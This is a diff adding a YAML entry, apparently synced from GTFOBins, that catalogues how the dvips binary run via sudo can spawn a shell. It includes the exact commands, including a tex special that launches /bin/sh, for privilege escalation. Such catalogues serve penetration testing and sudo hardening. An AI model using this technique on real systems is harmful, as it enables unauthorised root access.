@@ -1,0 +1,33 @@
+id: gtfobins/dvips/shell/sudo
+type: binary
+platform: linux
+name: dvips
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: dvips -R0 texput.dvi
+  comment: 'The `texput.dvi` output file produced by `tex` can be created offline and uploaded to the
+    target.
+
+
+    ```
+
+    tex ''\special{psfile="`/bin/sh 1>&0"}\end''
+
+    ```'
+references:
+- https://gtfobins.github.io/gtfobins/dvips/
+tags:
+- linux
+- unix
+- gtfobins
